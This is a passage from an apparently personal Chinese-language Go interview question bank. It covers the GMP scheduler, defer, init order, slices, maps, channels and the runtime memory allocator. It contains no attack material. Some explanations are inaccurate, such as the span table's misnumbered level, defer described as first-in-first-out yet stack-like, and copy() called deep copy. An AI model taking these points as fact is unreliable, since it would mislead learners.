context.WithCancel(context.Background())</span><br><span class="line">    <span class="keyword">for</span> n := <span class="keyword">range</span> gen(ctx) &#123;</span><br><span class="line">        fmt.Println(n)</span><br><span class="line">        <span class="keyword">if</span> n &gt;= <span class="number">5</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cancel()</span><br><span class="line">    time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的例子中，主要描述的是通过一个channel实现一个为循环次数为5的循环，在每一个循环中产生一个goroutine，每一个goroutine中都传入context，在每个goroutine中通过传入ctx创建一个子Context,并且通过select一直监控该Context的运行情况，当在父Context退出的时候，代码中并没有明显调用子Context的Cancel函数，但是分析结果，子Context还是被正确合理的关闭了，这是因为，所有基于这个Context或者衍生的子Context都会收到通知，这时就可以进行清理操作了，最终释放goroutine，这就优雅的解决了goroutine启动后不可控的问题。</p></li></ol><h2 id="⭐golang-gmp模型，全局队列中的G会不会饥饿-为什么？P的数量是多少？能修改吗？M的数量是多少？"><a href="#⭐golang-gmp模型，全局队列中的G会不会饥饿-为什么？P的数量是多少？能修改吗？M的数量是多少？" class="headerlink" title="⭐golang gmp模型，全局队列中的G会不会饥饿,为什么？P的数量是多少？能修改吗？M的数量是多少？"></a>⭐golang gmp模型，全局队列中的G会不会饥饿,为什么？P的数量是多少？能修改吗？M的数量是多少？</h2><p>全局队列中的G不会饥饿，P中每执行61次调度，就需要优先从全局队列中获取一个G到当前P中，并执行下一个要执行的G。</p><p>调度协程的优先级与顺序：<br><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220403162913.png" alt="img"></p><p>P，可以通过 <code>runtime.GOMAXPROCS()</code> 设置数量，默认为当前CP</p><p><strong>M数量问题</strong><br>Go语⾔本身是限定M的<strong>最⼤量是10000</strong>。<br><code>runtime/debug</code>包中的SetMaxThreads函数来设置。<br>有⼀个M阻塞，会创建⼀个新的M。<br>如果有M空闲，那么就会回收或者睡眠。</p><h2 id="go-语言的-panic-如何恢复"><a href="#go-语言的-panic-如何恢复" class="headerlink" title="go 语言的 panic 如何恢复"></a>go 语言的 panic 如何恢复</h2><p>recover()<br>recover和panic必须在同一个goroutine中<br>recover必须放到延迟执行函数defer中</p><h2 id="defer-的执行顺序"><a href="#defer-的执行顺序" class="headerlink" title="defer 的执行顺序"></a>defer 的执行顺序</h2><p>在同一个函数中，defer 函数调用的执行顺序与它们分别所属的 defer 语句的出现顺序完全相反。当一个函数即将结束执行时，写在最下面的 defer 函数调用会最先执行，其次是写在他上边，与它的距离最近的那个 defer 函数调用，以此类推，最上面的 defer 函数调用会最后一个执行。<br>需要注意一下 for 循环中的 defer 执行顺序。如果函数中有一条 for 循环语句，并且这个 for 循环语句中包含了一条 defer 语句，那么 defer 语句的执行是怎样的？弄清楚这个问题需要弄明白 defer 语句执行时发生的事情。在 defer 语句每次执行的时候，go 语言会把它携带的 defer 函数及其参数值存储到一个链表中，这个链表叫做 goroutine_defer。这个链表与 defer 语句所属的函数是对应的，它是先进先出的，相当于一个栈。在执行某个函数中的 defer 函数调用的时候，go 语言会先拿到对应的链表，然后从链表中一个一个取出 defer 函数及其参数值，逐个调用，这也就是为什么说 “defer 函数调用的执行顺序与它们分别所属的 defer 语句的出现顺序完全相反”。</p><h2 id="服务器能开多少个M由什么决定"><a href="#服务器能开多少个M由什么决定" class="headerlink" title="服务器能开多少个M由什么决定"></a>服务器能开多少个M由什么决定</h2><ul><li>由于M必须持有一个P才可以运行Go代码，所以同时运行的M个数，也即线程数一般等同于CPU的个数，以达到尽可能的使用CPU而又不至于产生过多的线程切换开销。</li><li>P的个数默认等于CPU核数，每个M必须持有一个P才可以执行G，一般情况下M的个数会略大于P的个数，这多出来的M将会在G产生系统调用时发挥作用。</li><li>Go语⾔本身是限定M的最⼤量是10000，可以在runtime/debug包中的SetMaxThreads函数来修改设置</li></ul><h2 id="服务器能开多少个P由什么决定"><a href="#服务器能开多少个P由什么决定" class="headerlink" title="服务器能开多少个P由什么决定"></a>服务器能开多少个P由什么决定</h2><ul><li>P的个数在程序启动时决定，默认情况下等同于CPU的核数</li><li>程序中可以使用 runtime.GOMAXPROCS() 设置P的个数，在某些IO密集型的场景下可以在一定程度上提高性能。</li><li>一般来讲，程序运行时就将GOMAXPROCS大小设置为CPU核数，可让Go程序充分利用CPU。在某些IO密集型的应用里，这个值可能并不意味着性能最好。理论上当某个Goroutine进入系统调用时，会有一个新的M被启用或创建，继续占满CPU。但由于Go调度器检测到M被阻塞是有一定延迟的，也即旧的M被阻塞和新的M得到运行之间是有一定间隔的，所以在IO密集型应用中不妨把GOMAXPROCS设置的大一些，或许会有好的效果。</li></ul><h2 id="M和P是怎么样的关系"><a href="#M和P是怎么样的关系" class="headerlink" title="M和P是怎么样的关系"></a>M和P是怎么样的关系</h2><p>M必须拥有P才可以执行G中的代码，理想情况下一个M对应一个P，P含有包含多个G的队列，P会周期性地将G调度到M种执行。</p><h2 id="同时启动了一万个G，如何调度？"><a href="#同时启动了一万个G，如何调度？" class="headerlink" title="同时启动了一万个G，如何调度？"></a>同时启动了一万个G，如何调度？</h2><p>首先一万个G会按照P的设定个数，尽量平均地分配到每个P的本地队列中。如果所有本地队列都满了，那么剩余的G则会分配到GMP的全局队列上。接下来便开始执行GMP模型的调度策略：</p><ul><li><strong>本地队列轮转</strong>：每个P维护着一个包含G的队列，不考虑G进入系统调用或IO操作的情况下，P周期性的将G调度到M中执行，执行一小段时间，将上下文保存下来，然后将G放到队列尾部，然后从队首中重新取出一个G进行调度。</li><li><strong>系统调用</strong>：上面说到P的个数默认等于CPU核数，每个M必须持有一个P才可以执行G，一般情况下M的个数会略大于P的个数，这多出来的M将会在G产生系统调用时发挥作用。当该G即将进入系统调用时，对应的M由于陷入系统调用而进被阻塞，将释放P，进而某个空闲的M1获取P，继续执行P队列中剩下的G。</li><li><strong>工作量窃取</strong>：多个P中维护的G队列有可能是不均衡的，当某个P已经将G全部执行完，然后去查询全局队列，全局队列中也没有新的G，而另一个M中队列中还有3很多G待运行。此时，空闲的P会将其他P中的G偷取一部分过来，一般每次偷取一半。</li></ul><h2 id="go的init函数是什么时候执行的？"><a href="#go的init函数是什么时候执行的？" class="headerlink" title="go的init函数是什么时候执行的？"></a>go的init函数是什么时候执行的？</h2><ul><li>init函数的主要作用：<br>1）初始化不能采用初始化表达式初始化的变量。<br>2）程序运行前的注册。<br>3）实现sync.Once功能。<br>4）其他</li><li>init函数的主要特点：<br>1）init函数先于main函数自动执行，不能被其他函数调用；<br>2）init函数没有输入参数、返回值；<br>3）每个包可以有多个init函数；<br>4）包的每个源文件也可以有多个init函数，这点比较特殊；<br>5）同一个包的init执行顺序，golang没有明确定义，编程时要注意程序不要依赖这个执行顺序。<br>6）不同包的init函数按照包导入的依赖关系决定执行顺序。</li><li>golang程序初始化<br>golang程序初始化先于main函数执行，由runtime进行初始化，初始化顺序如下：<br>1）初始化导入的包（包的初始化顺序并不是按导入顺序（“从上到下”）执行的，runtime需要解析包依赖关系，没有依赖的包最先初始化，与变量初始化依赖关系类似，参见golang变量的初始化）；<br>2）初始化包作用域的变量（该作用域的变量的初始化也并非按照“从上到下、从左到右”的顺序，runtime解析变量依赖关系，没有依赖的变量最先初始化，参见golang变量的初始化）；<br>3）执行包的init函数；</li></ul><p><strong>故，最终初始化顺序:变量初始化 -&gt; init() -&gt; main()</strong></p>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（九）</title>
      <link href="/posts/19444.html"/>
      <url>/posts/19444.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（九）"><a href="#Golang题库（九）" class="headerlink" title="Golang题库（九）"></a>Golang题库（九）</h1><h2 id="怎么用go实现一个栈"><a href="#怎么用go实现一个栈" class="headerlink" title="怎么用go实现一个栈"></a>怎么用go实现一个栈</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个队列</span></span><br><span class="line"><span class="keyword">type</span> MyStack <span class="keyword">struct</span> &#123;</span><br><span class="line">    queue []<span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Constructor</span><span class="params">()</span></span> MyStack &#123;</span><br><span class="line">    <span class="keyword">return</span> MyStack&#123;</span><br><span class="line">        queue: <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>), </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *MyStack)</span></span> Push(x <span class="type">int</span>)  &#123;</span><br><span class="line">    this.queue = <span class="built_in">append</span>(this.queue, x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *MyStack)</span></span> Pop() <span class="type">int</span> &#123;<span class="comment">//出队操作</span></span><br><span class="line">    n := <span class="built_in">len</span>(this.queue)<span class="number">-1</span> </span><br><span class="line">    <span class="keyword">for</span> n!=<span class="number">0</span>&#123; <span class="comment">////除了最后一个，其余的都重新添加到队列里</span></span><br><span class="line">        val := this.queue[<span class="number">0</span>]</span><br><span class="line">        this.queue = this.queue[<span class="number">1</span>:]</span><br><span class="line">        this.queue = <span class="built_in">append</span>(this.queue, val)</span><br><span class="line">        n--</span><br><span class="line">    &#125;<span class="comment">//新入队元素x到了最前面，出队时直接出-》后入先出</span></span><br><span class="line">    val := this.queue[<span class="number">0</span>]</span><br><span class="line">    this.queue = this.queue[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *MyStack)</span></span> Top() <span class="type">int</span> &#123;</span><br><span class="line">    val := this.Pop()</span><br><span class="line">    this.queue = <span class="built_in">append</span>(this.queue, val)</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *MyStack)</span></span> Empty() <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(this.queue)==<span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问了一些Golang的基本知识，如slice用copy和左值进行初始化的区别"><a href="#问了一些Golang的基本知识，如slice用copy和左值进行初始化的区别" class="headerlink" title="问了一些Golang的基本知识，如slice用copy和左值进行初始化的区别"></a>问了一些Golang的基本知识，如slice用copy和左值进行初始化的区别</h2><ol><li><code>copy(slice2, slice1)</code>实现的是<strong>深拷贝</strong>。拷贝的是<strong>数据本身</strong>，创造一个新对象，新创建的对象与原对象不共享内存，新创建的对象在内存中开辟一个新的内存地址，新对象值修改时不会影响原对象值。<br>同样的还有：遍历slice进行append赋值</li><li>如<code>slice2 := slice1</code>实现的是浅拷贝。<strong>拷贝的是数据地址</strong>，只复制指向的对象的指针，此时新对象和老对象指向的内存地址是一样的，新对象值修改时老对象也会变化。默认赋值操作就是浅拷贝。</li></ol><h2 id="channel是否线程安全等"><a href="#channel是否线程安全等" class="headerlink" title="channel是否线程安全等"></a>channel是否线程安全等</h2><ul><li>channel为什么设计成线程安全?<br>不同协程通过channel进行通信，本身的使用场景就是多线程，为了保证数据的一致性，必须实现线程安全。</li><li>channel如何实现线程安全的?<br>channel的底层实现中， hchan结构体中采用Mutex锁来保证数据读写安全。在对循环数组buf中的数据进行入队和出队操作时，必须先获取互斥锁，才能操作channel数据。</li></ul><h2 id="go的map是线程安全的吗？"><a href="#go的map是线程安全的吗？" class="headerlink" title="go的map是线程安全的吗？"></a>go的map是线程安全的吗？</h2><p><strong>不是</strong></p><p><code>sync.map </code>才是线程安全的。</p><h2 id="Go语言Slice是否线程安全"><a href="#Go语言Slice是否线程安全" class="headerlink" title="Go语言Slice是否线程安全"></a>Go语言Slice是否线程安全</h2><p><strong>不是</strong></p><p>Go语言实现线程安全常用的几种方式:</p><ol><li>互斥锁；</li><li>读写锁；</li><li>原子操作；</li><li>sync.once；</li><li>sync.atomic；</li><li>channel</li></ol><p>slice底层结构并没有使用加锁等方式，不支持并发读写，所以并不是线程安全的，使用多个goroutine对类型为slice的变量进行操作，每次输出的值大概率都不会一样，与预期值不一致; slice在并发执行中不会报错，但是数据会丢失。</p><h2 id="make可以初始化哪些结构"><a href="#make可以初始化哪些结构" class="headerlink" title="make可以初始化哪些结构"></a>make可以初始化哪些结构</h2><ul><li>slice</li><li>map</li><li>channel</li></ul><h2 id="new和make对比"><a href="#new和make对比" class="headerlink" title="new和make对比"></a>new和make对比</h2><ul><li>make 只能用来分配及初始化类型为 slice、map、chan 的数据。new 可以分配任意类型的数据；</li><li>new 分配返回的是指针，即类型 *Type。make 返回引用，即 Type；</li><li>new 分配的空间被清零。make 分配空间后，会进行初始化；</li><li>make 函数只用于 map，slice 和 channel，并且不返回指针</li></ul><h2 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Go语言运行时依靠细微的对象切割、极致的多级缓存、精准的位图管理实现了对内存的精细化管理。</span><br></pre></td></tr></table></figure><p> 将对象分为微小对象、小对象、大对象，使用三级管理结构mcache、mcentral、mheap用于管理、缓存加速span对象的访问和分配，使用精准的位图管理已分配的和未分配的对象及对象的大小。<br>​ Go语言运行时依靠细微的对象切割、极致的多级缓存、精准的位图管理实现了对内存的精细化管理以及快速的内存访问，同时减少了内存的碎片。</p><p><strong>Span</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Go 将内存分成了67个级别的scan，特殊的0级特殊大对象大小是不固定的。</span><br></pre></td></tr></table></figure><p>当具体的对象需要分配内存时，并不是直接分配span，而是分配不同级别的span中的元素。因此span的级别不是以每个span的大小为依据，而是以span中元素的大小为依据的。</p><table><thead><tr><th>Span等级</th><th>元素大小(字节)</th><th>Span大小(字节)</th><th>元素个数</th></tr></thead><tbody><tr><td>1</td><td>8</td><td>8192</td><td>1024</td></tr><tr><td>2</td><td>16</td><td>8192</td><td>512</td></tr><tr><td>3</td><td>32</td><td>8192</td><td>256</td></tr><tr><td>4</td><td>48</td><td>8192</td><td>170</td></tr><tr><td>65</td><td>64</td><td>8192</td><td>128</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td></tr><tr><td>65</td><td>28672</td><td>57344</td><td>2</td></tr><tr><td>66</td><td>32768</td><td>32768</td><td>1</td></tr></tbody></table><p>第1级span拥有的元素个数为8192/8=1024。每个span的大小和span中元素的个数都不是固定的，例如第65级span的大小为57344字节，每个元素的大小为28672字节，元素个数为2。span的大小虽然不固定，但其是8KB或更大的连续内存区域。<br>每个具体的对象在分配时都需要对齐到指定的大小，假如我们分配17字节的对象，会对应分配到比17字节大并最接近它的元素级别，即第3级，这导致最终分配了32字节。因此，这种分配方式会不可避免地带来内存的浪费。</p><p><strong>三级对象管理</strong></p><p>为了方便对Span进行管理，加速Span对象访问、分配。分别为<strong>mcache、mcentral、mheap。</strong><br>TCMalloc内存分配算法的思想:<br>每个逻辑处理器P都存储了一个本地span缓存，称作mcache。如果协程需要内存可以直接从mcache中获取，由于在同一时间只有一个协程运行在逻辑处理器P上，所以中间不需要加锁。mcache包含所有大小规格的mspan，但是每种规格大小只包含一个。除class0外，mcache的span都来自mcentral。</p><p>mcentral 所有逻辑处理器P共享的。</p><ul><li><p>对象收集所有给定规格大小的span。每个mcentral都包含<strong>两个mspan的链表：empty mspanList表示没有空闲对象或span已经被mcache缓存的span链表，nonempty mspanList表示有空闲对象的span链表。</strong>(为了的分配Mspan到Mcache中)</p><p>mheap 每个级别的span都会有一个mcentral用于管理span链表（0级除外），其实 都是一个数组，由Mheap管理<br>作用：<br>不只是管理central，大对象也会直接通过mheap进行分配。</p></li><li><p>mheap实现了对虚拟内存线性地址空间的精准管理，建立了span与具体线性地址空间的联系，保存了分配的位图信息，是管理内存的最核心单元。堆区的内存被分成了HeapArea大小进行管理。对Heap进行的操作必须全局加锁，而mcache、mcentral可以被看作某种形式的缓存。</p></li></ul><p>（三级缓存对象图）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image-20220401203626614.png" alt="img"></p><p>（mheap管理虚拟内存线性地址空间）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image.png" alt="img"></p><p><strong>四级内存块管理</strong></p><p>Go 根据对象大小，将堆内存分成了 <strong>HeapArea-&gt;chunk-&gt;span-&gt;page</strong> 4种内存块进行管理。不同的内存块用于不同的场景，便于高效地对内存进行管理。</p><ul><li>HeapArea 内存块最大，其大小与平台相关，在UNIX 64位操作系统中占据64MB。</li><li>chunk占据了512KB</li><li>span根据级别大小的不同而不同，但必须是page的倍数</li><li>而1个page占据8KB</li></ul><p>（内存块管理结构）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image%20(1).png" alt="img"></p><p><strong>对象分配</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在运行时分配对象的逻辑主要位于mallocgc函数中，这个名字很有意思，malloc代表分配，gc代表垃圾回收（GC），此函数除了分配内存还会为垃圾回收做一些位图标记工作。</span><br><span class="line">内存分配时，将对象按照大小不同划分为微小（tiny）对象、小对象、大对象。微小对象的分配流程最长，逻辑链路最复杂</span><br></pre></td></tr></table></figure><p><strong>微小对象</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小于16字节的都被划分成了微小对象，微小对象主要处理极小的字符串和独立的转义变量。</span><br></pre></td></tr></table></figure><p>微小对象会被放入class为2的span中，首先对微小对象按照2、4、8的规则进行字节对齐。例如，字节为1的元素会被分配2字节，字节为7的元素会被分配8字节。</p><p>微小对象分配时，查看之前分配的元素中是否有空余的空间，如果当前对象要分配8字节，并且正在分配的元素可以容纳8字节，则返回tiny+offset的地址，分配完成后offset的位置也需要相应增加，为下一次分配做准备。</p><p>如果当前要分配的元素空间不够，将尝试从mcache中查找span中下一个可用的元素。因此，tiny分配的第一步是尝试利用分配过的前一个元素的空间，达到节约内存的目的。</p><p>（微小对象分配）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image-c85dfbcf-c2b4-4f74-a2ad-a88d7e222e9a709382768807207797.jpg" alt="img"></p><p>tiny offset代表当前已分配内存的偏移量）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image%20(2).png" alt="img"></p><p><strong>Mcache 缓存位图</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在查找空闲元素空间时，首先需要从mcache中找到对应级别的mspan，mspan中拥有allocCache字段，其作为一个位图，用于标记span中的元素是否被分配。由于allocCache元素为uint64，因此其最多一次缓存64字节。</span><br></pre></td></tr></table></figure><p>有时候，span中元素的个数大于64，因此需要专门有一个字段freeindex标识当前span中的元素被分配到了哪里。span中小于freeindex序号的元素都已经被分配了，将从freeindex开始继续分配。<br>因此，只要从allocCache开始找到哪一位为0即可。假如X位为0，那么X+freeindex为当前span中可用的元素序号。当allocCache中的bit位全部被标记为1后，需要移动freeindex，并更新allocCache，一直到span中元素的末尾为止。</p><p>（allocCache位图标记span中的元素是否被分配）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image%20(3).png" alt="img"></p><p>（freeindex之前的元素都已被分配）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image%20(4).png" alt="img"></p><p><strong>mcentral 遍历 span</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果当前的span中没有可以使用的元素，这时就需要从mcentral中加锁查找。mcentral中有两种类型的span链表，分别是有空闲元素的nonempty链表和没有空闲元素的empty链表。在mcentral查找时，会分别遍历这两个链表，查找是否有可用的span。</span><br></pre></td></tr></table></figure><p><strong>既然是没有空闲元素的empty链表，为什么还需要遍历呢？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是由于可能有些span虽然被垃圾回收器标记为空闲了，但是还没有来得及清</span><br></pre></td></tr></table></figure><p><strong>Mheap 缓存查找</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果在mcentral中找不到可以使用的span，就需要在mheap中查找。Go 1.12 采用treap结构进行内存管理，treap是一种引入了随机数的二叉搜索树，其实现简单，引入的随机数及必要时的旋转保证了比较好的平衡性。这种方式有扩展性的问题，由于这棵树是mheap管理的，所以在操作它时需要维持一个lock。这在密集的对象分配及逻辑处理器P过多时，会导致更长的等待时间。使用bitmap来管理内存页，我们会看到每个逻辑处理器P中都维护了一份page cache，这就是现在Go实现的方式。</span><br><span class="line">  mheap会首先查找每个逻辑处理器P中pageCache字段的cache。cache也是一个位图，每一位都代表了一个page（8 KB）。由于cache为uint64，因此一共可以提供64×8=512KB的连续虚拟内存。在cache中，1代表未分配的内存，0代表已分配的内存。base代表该虚拟内存的基地址。当需要分配的内存小于512/4=128KB时，需要首先从cache中分配。在分配 n 个page 需要查找 cache中是否有连续的n为1的单位，如果存在，在缓存中找到了合适的内存，用于构建Span。</span><br></pre></td></tr></table></figure><p><strong>mheap基数树查找</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果要分配的page过大或者在逻辑处理器P的cache中没有找到可用的page，就需要对mheap加锁，并在整个mheap管理的虚拟地址空间的位图中查找是否有可用的page，这涉及Go语言对线性地址空间的位图管理。</span><br></pre></td></tr></table></figure><p>管理线性地址空间的位图结构叫作基数树（radix tree），结构和一般的基数树结构不太一样，会有这个名字很大一部分是由于父节点包含了子节点的若干信息。</p><p>（内存管理基数树结构）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image%20(5).png" alt="img"></p><p>该树中的每个节点都对应一个pallocSum，最底层的叶子节点对应的pallocSum包含一个chunk的信息（512×8KB），除叶子节点外的节点都包含连续8个子节点的内存信息。例如，倒数第2层的节点包含连续8个叶子节点（即8×chunk）的内存信息。因此，越上层的节点对应的内存越多。<br>pallocSum是一个简单的uint64，分为开头（start）、中间（max）、末尾（end）3部分，pallocSum的开头与末尾部分各占21bit，中间部分占22bit，它们分别包含了这个区域中连续空闲内存页的信息，包括开头有多少连续内存页，最多有多少连续内存页，末尾有多少连续内存页。对于最顶层的节点，由于其max位为22bit，因此一棵完整的基数树最多代表2的21次方 pages=16GB内存。<br>不需要每一次查找都从根节点开始。在Go中，存储了一个特别的字段<strong>searchAddr，用于搜索可用内存的</strong>。利用searchAddr可以加速内存查找。searchAddr有一个重要的设定<strong>是它前面的地址一定是已经分配过的</strong>，因此在查找时，只需要向searchAddr地址的后方查找即可跳过已经查找的节点，减少查找的时间。</p><p>（利用searchAddr加速内存查找）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/Screenshot_20220403-151709.png" alt="img"></p><p>在第1次查找时，会从当前searchAddr的chunk块中查找是否有对应大小的连续空间，这种优化主要针对比较小的内存（至少小于512KB）分配。Go对内存有非常精细的管理，chunk块的每个page（8 KB)都有位图表明其是否已经被分配。<br>每个chunk都有一个pallocData结构，其中pallocBits管理其分配的位图。pallocBits是uint64，有8字节，由于其每一位对应一个page，因此pallocBits一共对应64×8=512KB，恰好是一个chunk块的大小。位图的对应方式和之前是一样的。<br>而所有的chunk pallocData都在pageAlloc结构中进行管理。<br>当内存分配过大或者当前chunk块没有连续的npages空间时，需要到基数树中从上到下进行查找。基数树有一个特性——要分配的内存越大，它能够越快地查找到当前的基数树中是否有连续的满足需求的空间。</p><p>在查找基数树的过程中，需要从上到下、从左到右地查找每个节点是否符合要求。先计算pallocSum的开头有多少连续的内存空间，如果大于或等于npages，则说明找到了可用的空间和地址。如果小于npages，则会计算pallocSum字段的max，即中间有多少连续的内存空间。如果max大于或等于npages，那么需要继续向基数树当前节点对应的下一级查找，原因在于，max大于npages，表明当前一定有连续的空间大于或等于npages，但是并不知道具体在哪一个位置，必须查找下一级才能找到可用的地址。如果max也不满足，那么是不是就不满足了呢？不一定，如图18-13所示，有可能两个节点可以合并起来组成一个更大的连续空间。因此还需要将当前pallocSum计算的end与后一个节点的start加起来查看是否能够组合成大于npages的连续空间。</p><p>（更大的可用内存可能跨越了多个pallocSum）</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image%20(6).png" alt="img"></p><p><strong>每一次从基数树中查找到内存，或者事后从操作系统分配到内存时，都需要更新基数树中每个节点的pallocSum。</strong></p><p><strong>操作系统内存申请</strong></p><p>当在基数树中查找不到可用的连续内存时，需要从操作系统中获取内存。从操作系统获取内存的代码是平台独立的，（例如在UNIX操作系统中，最终使用了mmap系统调用向操作系统申请内存。）</p><p>Go语言规定，<strong>每一次向操作系统申请的内存大小必须为heapArena的倍数</strong>。heapArena是和平台有关的内存大小，在64位UNIX操作系统中，其大小为64MB。这意味着即便需要的内存很小，最终也至少要向操作系统申请64MB内存。多申请的内存可以用于下次分配。<br>Go语言中对于heapArena有精准的管理，精准到每个指针大小的内存信息，每个page对应的mspan信息都有记录。</p><p><strong>小对象分配</strong></p><p>当对象不属于微小对象时，在内存分配时会继续判断其是否为小对象，小对象指小于32KB的对象。Go会计算小对象对应哪一个等级的span，并在指定等级的span中查找。<br>此后和微小对象的分配一样，小对象分配经历mcache→mcentral→mheap位图查找→mheap基数树查找→操作系统分配的过程。</p><p><strong>大对象分配</strong></p><p>大对象指大于32KB的对象，内存分配时不与mcache和mcentral沟通，直接通过mheap进行分配。大对象分配经历mheap基数树查找→操作系统分配的过程。每个大对象都是一个特殊的span，其class为0。</p><h2 id="goroutine-为什么轻量"><a href="#goroutine-为什么轻量" class="headerlink" title="goroutine 为什么轻量"></a>goroutine 为什么轻量</h2><ul><li>从资源消耗方面来看，它只需要一个2Kb的内存栈就可以运行；</li><li>从运行时来看，它的运行成本很低，将一个goroutine切换到另一个goroutine并不需要很多操作</li></ul><h2 id="go-深拷贝发生在什么情况下？切片的深拷贝是怎么做的？"><a href="#go-深拷贝发生在什么情况下？切片的深拷贝是怎么做的？" class="headerlink" title="go 深拷贝发生在什么情况下？切片的深拷贝是怎么做的？"></a>go 深拷贝发生在什么情况下？切片的深拷贝是怎么做的？</h2><p><strong>深拷贝，浅拷贝概念</strong></p><ol><li>深拷贝（Deep Copy）：</li></ol><p>拷贝的是数据本身，创造一个样的新对象，新创建的对象与原对象不共享内存，新创建的对象在内存中开辟一个新的内存地址，新对象值修改时不会影响原对象值。既然内存地址不同，释放内存地址时，可分别释放。</p><ol><li>浅拷贝（Shallow Copy）：</li></ol><p>拷贝的是数据地址，只复制指向的对象的指针，此时新对象和老对象指向的内存地址是一样的，新对象值修改时老对象也会变化。释放内存地址时，同时释放内存地址。<a href="https://blog.csdn.net/guichenglin/article/details/105601886">参考来源</a><br>在go语言中值类型赋值都是深拷贝，引用类型一般都是浅拷贝：</p><ul><li>值类型的数据，默认全部都是深拷贝：Array、Int、String、Struct、Float，Bool</li><li>引用类型的数据，默认全部都是浅拷贝：Slice，Map</li></ul><p>对于引用类型，想实现深拷贝，不能直接 := ，而是要先开辟地址空间（new） ，再进行赋值。</p><p><strong>怎么进行（切片的）深拷贝？</strong></p><p>可以使用 copy() 函数来进行深拷贝，copy 不会进行扩容，当要复制的 slice 比原 slice 要大的时候，只会移除多余的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">    slice1 := []int&#123;1, 2, 3, 4, 5&#125;</span><br><span class="line">    slice2 := []int&#123;6, 7, 8&#125;</span><br><span class="line"></span><br><span class="line">    copy(slice2, slice1) // 